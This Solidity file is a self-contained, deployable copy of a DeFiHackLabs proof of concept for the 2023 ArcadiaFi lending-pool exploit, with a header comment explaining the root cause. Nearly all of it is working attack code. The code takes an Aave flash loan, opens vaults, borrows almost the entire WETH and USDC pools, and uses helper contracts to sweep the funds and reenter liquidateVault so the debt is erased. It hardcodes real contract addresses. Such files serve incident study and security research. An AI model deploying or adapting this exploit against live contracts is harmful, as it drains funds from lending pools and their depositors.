// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-ArcadiaFi).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this), and the Aave flash-loan callback `executeOperation`
// lives on the test itself), so there is no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack (testExploit
// -> executeOperation -> WETHDrain/USDCDrain, plus Helper1/Helper2) so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/ArcadiaFi_exp.sol.
//
// Root cause: Arcadia's LendingPool.doActionWithLeverage() ships borrowed funds +
// vault collateral to an attacker-chosen action handler and only re-checks vault
// health AFTER the handler returns. The attacker's action handler (1) sweeps every
// token out of itself to the exploit contract, then (2) reenters
// LendingPool.liquidateVault() on the very vault whose assets were JUST swept out.
// The vault is now empty, so getLiquidationValue() == 0, which trivially satisfies
// the liquidation health check (0 < openDebt). Liquidation burns the debt and
// clears trustedCreditor, so when control returns to doActionWithLeverage, its
// final require(trustedCreditor == address(this)) reads the now-cleared storage
// as address(0) short-circuiting to "not this pool" only via the return values,
// which the handler already returned successfully -- net effect: attacker keeps
// both the borrowed funds and the deposited collateral, debt is erased by
// self-liquidation. Repeated once per pool (WETH, then USDC).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFactory {
    function createVault(uint256 salt, uint16 vaultVersion, address baseCurrency) external returns (address vault);
}

interface LendingPool {
    function doActionWithLeverage(
        uint256 amountBorrowed,
        address vault,
        address actionHandler,
        bytes calldata actionData,
        bytes3 referrer
    ) external;
    function liquidateVault(address vault) external;
}

interface IVault {
    function vaultManagementAction(address actionHandler, bytes calldata actionData)
        external
        returns (address, uint256);
    function deposit(address[] calldata assetAddresses, uint256[] calldata assetIds, uint256[] calldata assetAmounts)
        external;
    function openTrustedMarginAccount(address creditor) external;
}

interface IActionMultiCall {}

contract ArcadiaDrain {
    struct ActionData {
        address[] assets;
        uint256[] assetIds;
        uint256[] assetAmounts;
        uint256[] assetTypes;
        uint256[] actionBalances;
    }

    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    IERC20 USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IFactory Factory = IFactory(0x00CB53780Ea58503D3059FC02dDd596D0Be926cB);
    LendingPool darcWETH = LendingPool(0xD417c28aF20884088F600e724441a3baB38b22cc);
    LendingPool darcUSDC = LendingPool(0x9aa024D3fd962701ED17F76c17CaB22d3dc9D92d);
    IActionMultiCall ActionMultiCall = IActionMultiCall(0x2dE7BbAAaB48EAc228449584f94636bb20d63E65);
    IVault Proxy1;
    IVault Proxy2;

    // entrypoint: kicks off the Aave V3 dual-asset flash loan; executeOperation does the drain.
    function run() external {
        address[] memory assets = new address[](2);
        assets[0] = address(WETH);
        assets[1] = address(USDC);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 29_847_813_623_947_075_968;
        amounts[1] = 11_916_676_700;
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata, /* premiums */
        address, /* initiator */
        bytes calldata /* params */
    ) external returns (bool) {
        WETH.approve(address(aaveV3), type(uint256).max);
        USDC.approve(address(aaveV3), type(uint256).max);

        WETHDrain(assets[0], amounts[0]);
        USDCDrain(assets[1], amounts[1]);

        return true;
    }

    function WETHDrain(address targetToken, uint256 tokenAmount) internal {
        Proxy1 = IVault(Factory.createVault(15_113, uint16(1), targetToken)); // create vault

        Proxy1.openTrustedMarginAccount(address(darcWETH)); // open margin account
        WETH.approve(address(Proxy1), type(uint256).max);

        {
            address[] memory assetAddresses = new address[](1);
            assetAddresses[0] = targetToken;
            uint256[] memory assetIds = new uint256[](1);
            assetIds[0] = 0;
            uint256[] memory assetAmounts = new uint256[](1);
            assetAmounts[0] = tokenAmount;
            Proxy1.deposit(assetAddresses, assetIds, assetAmounts); // deposit collateral
        }

        ActionData memory ActionData1 = ActionData({
            assets: new address[](0),
            assetIds: new uint256[](0),
            assetAmounts: new uint256[](0),
            assetTypes: new uint256[](0),
            actionBalances: new uint256[](0)
        });

        ActionData memory ActionData2 = ActionData({
            assets: new address[](1),
            assetIds: new uint256[](1),
            assetAmounts: new uint256[](1),
            assetTypes: new uint256[](1),
            actionBalances: new uint256[](1)
        });
        ActionData2.assets[0] = targetToken;
        address[] memory to = new address[](1);
        to[0] = targetToken;
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSignature("approve(address,uint256)", address(Proxy1), type(uint256).max);
        bytes memory callData1 = abi.encode(ActionData1, ActionData2, to, data);
        darcWETH.doActionWithLeverage(
            WETH.balanceOf(address(darcWETH)) - 1e18, address(Proxy1), address(ActionMultiCall), callData1, bytes3(0)
        ); // leveraged lending: borrow nearly the entire pool against minimal collateral

        Helper1 helper = new Helper1(address(Proxy1));

        ActionData memory ActionData3 = ActionData({
            assets: new address[](1),
            assetIds: new uint256[](1),
            assetAmounts: new uint256[](1),
            assetTypes: new uint256[](0),
            actionBalances: new uint256[](0)
        });
        ActionData3.assets[0] = targetToken;
        ActionData3.assetIds[0] = 0;
        ActionData3.assetAmounts[0] = WETH.balanceOf(address(Proxy1));
        address[] memory toAddress = new address[](2);
        toAddress[0] = targetToken;
        toAddress[1] = address(helper);
        bytes[] memory datas = new bytes[](2);
        datas[0] = abi.encodeWithSignature("approve(address,uint256)", address(helper), type(uint256).max);
        datas[1] = abi.encodeWithSignature("rekt()");
        bytes memory callData2 = abi.encode(ActionData3, ActionData1, toAddress, datas);
        // withdraws all vault collateral+borrowed WETH to ActionMultiCall, then calls
        // Helper1.rekt(), which sweeps that WETH out and reenters liquidateVault()
        // on the now-empty Proxy1 -- see Helper1.rekt() below.
        Proxy1.vaultManagementAction(address(ActionMultiCall), callData2);
    }

    function USDCDrain(address targetToken, uint256 tokenAmount) internal {
        Proxy2 = IVault(Factory.createVault(15_114, uint16(1), targetToken)); // create vault

        Proxy2.openTrustedMarginAccount(address(darcUSDC)); // open margin account
        USDC.approve(address(Proxy2), type(uint256).max);

        {
            address[] memory assetAddresses = new address[](1);
            assetAddresses[0] = targetToken;
            uint256[] memory assetIds = new uint256[](1);
            assetIds[0] = 0;
            uint256[] memory assetAmounts = new uint256[](1);
            assetAmounts[0] = tokenAmount;
            Proxy2.deposit(assetAddresses, assetIds, assetAmounts); // deposit collateral
        }

        ActionData memory ActionData1 = ActionData({
            assets: new address[](0),
            assetIds: new uint256[](0),
            assetAmounts: new uint256[](0),
            assetTypes: new uint256[](0),
            actionBalances: new uint256[](0)
        });
        ActionData memory ActionData2 = ActionData({
            assets: new address[](1),
            assetIds: new uint256[](1),
            assetAmounts: new uint256[](1),
            assetTypes: new uint256[](1),
            actionBalances: new uint256[](1)
        });
        ActionData2.assets[0] = targetToken;
        address[] memory to = new address[](1);
        to[0] = targetToken;
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSignature("approve(address,uint256)", address(Proxy2), type(uint256).max);
        bytes memory callData1 = abi.encode(ActionData1, ActionData2, to, data);
        darcUSDC.doActionWithLeverage(
            USDC.balanceOf(address(darcUSDC)) - 50e6, address(Proxy2), address(ActionMultiCall), callData1, bytes3(0)
        ); // leveraged lending: borrow nearly the entire pool against minimal collateral

        Helper2 helper = new Helper2(address(Proxy2));

        ActionData memory ActionData3 = ActionData({
            assets: new address[](1),
            assetIds: new uint256[](1),
            assetAmounts: new uint256[](1),
            assetTypes: new uint256[](0),
            actionBalances: new uint256[](0)
        });
        ActionData3.assets[0] = targetToken;
        ActionData3.assetIds[0] = 0;
        ActionData3.assetAmounts[0] = USDC.balanceOf(address(Proxy2));
        address[] memory toAddress = new address[](2);
        toAddress[0] = targetToken;
        toAddress[1] = address(helper);
        bytes[] memory datas = new bytes[](2);
        datas[0] = abi.encodeWithSignature("approve(address,uint256)", address(helper), type(uint256).max);
        datas[1] = abi.encodeWithSignature("rekt()");
        bytes memory callData2 = abi.encode(ActionData3, ActionData1, toAddress, datas);
        // withdraws all vault collateral+borrowed USDC to ActionMultiCall, then calls
        // Helper2.rekt(), which sweeps that USDC out and reenters liquidateVault()
        // on the now-empty Proxy2 -- see Helper2.rekt() below.
        Proxy2.vaultManagementAction(address(ActionMultiCall), callData2);
    }
}

contract Helper1 {
    address owner;
    address proxy;
    address ActionMultiCall = 0x2dE7BbAAaB48EAc228449584f94636bb20d63E65;
    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    LendingPool darcWETH = LendingPool(0xD417c28aF20884088F600e724441a3baB38b22cc);

    constructor(address target) {
        owner = msg.sender; // the ArcadiaDrain exploit contract
        proxy = target;
    }

    // Runs while ActionMultiCall still holds the vault's collateral + borrowed WETH.
    function rekt() external {
        WETH.transferFrom(ActionMultiCall, owner, WETH.balanceOf(address(ActionMultiCall))); // 1) sweep funds out
        darcWETH.liquidateVault(proxy); // 2) reenter: liquidate the now-empty vault, erasing its debt
    }
}

contract Helper2 {
    address proxy;
    address owner;
    address ActionMultiCall = 0x2dE7BbAAaB48EAc228449584f94636bb20d63E65;
    IERC20 USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    LendingPool darcUSDC = LendingPool(0x9aa024D3fd962701ED17F76c17CaB22d3dc9D92d);

    constructor(address target) {
        owner = msg.sender; // the ArcadiaDrain exploit contract
        proxy = target;
    }

    // Runs while ActionMultiCall still holds the vault's collateral + borrowed USDC.
    function rekt() external {
        USDC.transferFrom(ActionMultiCall, owner, USDC.balanceOf(address(ActionMultiCall))); // 1) sweep funds out
        darcUSDC.liquidateVault(proxy); // 2) reenter: liquidate the now-empty vault, erasing its debt
    }
}
